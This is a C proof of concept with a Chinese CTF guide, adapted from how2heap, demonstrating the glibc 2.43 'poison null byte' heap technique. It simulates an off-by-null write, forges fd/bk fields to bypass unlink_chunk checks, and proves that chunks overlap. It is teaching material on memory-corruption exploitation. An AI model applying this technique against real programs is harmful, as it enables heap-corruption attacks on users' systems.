/*
 * 中文导读（CTF 版）
 *
 * 手法：Poison Null Byte
 * 文件标注范围：glibc 2.43，x86-64 上游堆管理器。
 * 模拟漏洞：只能向相邻 chunk 的 size 字段最低字节写入一个空字节，也就是
 *   常说的 off-by-null。
 * 成功判据：最后一处 assert 证明新分配出来的 chunk 与仍在使用的 victim
 *   发生了重叠。
 *
 * 主链路与 2.29～2.42 的 residual-pointer 版本相同；但 2.43 的 tcache
 * 初始化和 TLS 布局会扰动本 PoC 依赖的 0x10000 低位对齐，因此第零步先
 * free(malloc(0x30))，固定先把 tcache metadata 创建出来，再去计算 padding
 * 大小。
 *
 * 来源：shellphish/how2heap poison_null_byte.c；本目录按 glibc 源码边界
 * 重命名、补充中文导读并在对应运行时验证。程序故意包含 UAF、越界写
 * 和对已释放 chunk 的读取，只能用于 CTF/教学与授权研究。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	// 第零步：先触发一次 tcache 元数据分配，避免首次 free 时的隐式初始化
	// 打乱后面精确设计的布局。
	free(malloc(0x30));

	// 第一步：用 padding 调整后续 largebin chunk 与 victim 在页内的相对
	// 位置。
	void *tmp = malloc(0x1);
	size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20;
	malloc(size);

	// 第二步：申请即将进入 largebin 的前块 prev，以及最终要被重叠的
	// 活动 victim。
	void *prev = malloc(0x500);
	void *victim = malloc(0x4f0);
	malloc(0x10);

	// 第三步：释放并整理 prev，让它进入 largebin，同时保留可以在重新分配
	// 后改写的链字段。
	void *a = malloc(0x4f0);

	malloc(0x10);
	void *b = malloc(0x510);

	malloc(0x10);

	free(a);
	free(b);
	free(prev);

	malloc(0x1000);

	// 第四步：重新取出 prev，在其内部构造一个能通过新版 prev_size
	// 检查的 fake chunk。
	void *prev2 = malloc(0x500);

	assert(prev == prev2);

	((long *)prev)[1] = 0x501;
	*(long *)(prev + 0x500) = 0x500;

	// 第五步：伪造出自洽的 fd/bk 关系，绕过 unlink_chunk 的双向链完整性
	// 检查。
	void *b2 = malloc(0x510);

	((char*)b2)[0] = '\x10';
	((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk

	void *a2 = malloc(0x4f0);
	free(a2);
	free(victim);

	void *a3 = malloc(0x4f0);
	((char*)a3)[8] = '\x10';
	((char*)a3)[9] = '\x00';

	// 下面这些伪造字段专门用来满足 malloc.c 中 unlink_chunk 的逻辑：
	// 源码第一步：mchunkptr fd = p->fd；
	// 源码第二步：mchunkptr bk = p->bk；
	// 检查条件：if (__builtin_expect (fd->bk != p || bk->fd != p, 0))；
	// 检查失败时会走到：malloc_printerr("corrupted double-linked list")。

	// 第六步：用 off-by-null 截短相邻的 free chunk，让合并逻辑把内部的
	// fake chunk 一起送入 unsorted bin。
	void *victim2 = malloc(0x4f0);

	/* 漏洞模拟开始：向下一块的 size 最低字节写入一个空字节。 */
	((char *)victim2)[-8] = '\x00';
	/* 漏洞模拟结束：下一块记录的有效 size 已经被截短。 */

	free(victim);

	// 第七步：重新分配这块合并后的区域，通过读写仍在使用的 victim 来验证
	// 真实发生了 chunk overlap。
	void *merged = malloc(0x100);

	memset(merged, 'A', 0x80);

	memset(prev2, 'C', 0x80);

	assert(strstr(merged, "CCCCCCCCC")); // merged 与 prev2 重叠，写入 prev2 的内容能从 merged 里读到。
}
